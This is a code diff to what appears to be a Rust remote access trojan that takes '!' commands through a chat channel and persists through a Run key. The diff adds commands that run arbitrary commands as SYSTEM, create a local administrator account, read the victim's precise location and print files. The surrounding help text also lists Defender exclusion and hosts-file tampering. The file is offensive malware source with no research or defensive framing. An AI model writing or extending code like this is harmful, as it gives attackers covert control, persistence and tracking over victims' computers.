@@ -54,6 +54,10 @@ const HELP: &str = "\
 !open <url>                open a URL in the default browser
 !defender [add|remove <p>] Defender status / exclusions
 !hosts [add <ip> <dom>|remove <dom>|clear]  edit the hosts file (+DNS flush)
+!print <file>              print a file on the default printer
+!location                  precise location (Windows Location API)
+!systask <cmd>             run a command as SYSTEM, return output (admin)
+!newuser <name> <pass>     create a local admin account (admin)
 !lock                      lock workstation
 !update                    pull newest build from #update and restart
 !uninstall                 remove payload + launcher + Run key, then stop
@@ -576,6 +580,39 @@ pub async fn dispatch(
                 st.send_code(console, &r).await?;
             } else {
                 let r = tokio::task::spawn_blocking(host::defender_status).await?;
+                st.send_code(console, &r).await?;
+            }
+        }
+        "print" => {
+            if arg.is_empty() {
+                st.send(console, "usage: !print <file>").await?;
+            } else {
+                let r = tokio::task::spawn_blocking(move || host::print_file(&arg)).await?;
+                st.send(console, if r.trim().is_empty() { "sent to printer" } else { &r })
+                    .await?;
+            }
+        }
+        "location" | "locate" => {
+            let r = tokio::task::spawn_blocking(host::location).await??;
+            st.send(console, &r).await?;
+        }
+        "systask" => {
+            if arg.is_empty() {
+                st.send(console, "usage: !systask <cmd>").await?;
+            } else {
+                let r = tokio::task::spawn_blocking(move || host::systask(&arg)).await??;
+                st.send_code(console, &r).await?;
+            }
+        }
+        "newuser" => {
+            let mut it = arg.split_whitespace();
+            let name = it.next().unwrap_or("");
+            let pass = it.next().unwrap_or("");
+            if name.is_empty() || pass.is_empty() {
+                st.send(console, "usage: !newuser <name> <password>").await?;
+            } else {
+                let (n, p) = (name.to_string(), pass.to_string());
+                let r = tokio::task::spawn_blocking(move || host::new_user(&n, &p)).await?;
                 st.send_code(console, &r).await?;
             }
         }
